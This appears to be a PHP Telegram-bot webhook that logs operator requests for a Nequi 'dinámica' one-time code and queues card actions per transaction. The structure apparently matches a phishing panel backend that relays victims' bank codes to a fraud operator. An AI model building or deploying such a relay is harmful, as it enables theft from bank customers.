<?php
// webhook.php - Webhook funcional para Telegram en Render
// Versión 2.1 - Guardando en ubicación correcta
header('Content-Type: application/json');

// Obtener el contenido del webhook
$input = file_get_contents('php://input');
$update = json_decode($input, true);

if ($update && isset($update['callback_query'])) {
    $callbackQuery = $update['callback_query'];
    $callbackData = $callbackQuery['data'];

    // Verificar si es un callback de solicitar dinamica (Nequi)
    if (strpos($callbackData, 'solicitar_dinamica_') === 0) {
        // Extraer transactionId del callback data
        $transactionId = str_replace('solicitar_dinamica_', '', $callbackData);

        // Actualizar el archivo de estado en la ubicación correcta para nequi-1
        $statusFile = $_SERVER['DOCUMENT_ROOT'] . '/data-ps/recargas/transaction/nequi-1/dinamica_status.json';

        // Crear directorios si no existen
        $dir = dirname($statusFile);
        if (!is_dir($dir)) {
            mkdir($dir, 0755, true);
        }

        $data = file_exists($statusFile) ? json_decode(file_get_contents($statusFile), true) : [];
        $data[$transactionId] = [
            'status' => 'dinamica_solicitada',
            'message_id' => null,
            'timestamp' => time()
        ];
        $result = file_put_contents($statusFile, json_encode($data));

        // Log para debug
        file_put_contents($_SERVER['DOCUMENT_ROOT'] . '/webhook_log.txt', date('Y-m-d H:i:s') . " - Transaction: $transactionId, File: $statusFile, Result: $result, Dir: $dir\n", FILE_APPEND);

        // También guardar en la raíz para compatibilidad
        $rootStatusFile = $_SERVER['DOCUMENT_ROOT'] . '/dinamica_status.json';
        $rootData = [
            'transactionId' => $transactionId,
            'status' => 'dinamica_solicitada',
            'timestamp' => time()
        ];
        file_put_contents($rootStatusFile, json_encode($rootData));

        // Responder al callback de Telegram
        $response = [
            'method' => 'answerCallbackQuery',
            'callback_query_id' => $callbackQuery['id'],
            'text' => 'Dinámica solicitada correctamente',
            'show_alert' => false
        ];

        echo json_encode($response);
        exit;
    }

    // Verificar si es un callback de tarjeta (ACTION:*)
    if (strpos($callbackData, 'ACTION:') === 0) {
        $action = str_replace('ACTION:', '', $callbackData);

        // Archivo para almacenar acciones pendientes de tarjetas
        $actionsFile = $_SERVER['DOCUMENT_ROOT'] . '/pending_actions.json';
        $actions = file_exists($actionsFile) ? json_decode(file_get_contents($actionsFile), true) : [];
        $actions[] = [
            'action' => $action,
            'data' => [],
            'timestamp' => time()
        ];
        file_put_contents($actionsFile, json_encode($actions));

        // Responder al callback de Telegram
        $response = [
            'method' => 'answerCallbackQuery',
            'callback_query_id' => $callbackQuery['id'],
            'text' => 'Procesando...',
            'show_alert' => false
        ];

        echo json_encode($response);
        exit;
    }
}

echo json_encode(['status' => 'ok', 'version' => '2.3', 'deployed' => true]);
?>// Force redeploy
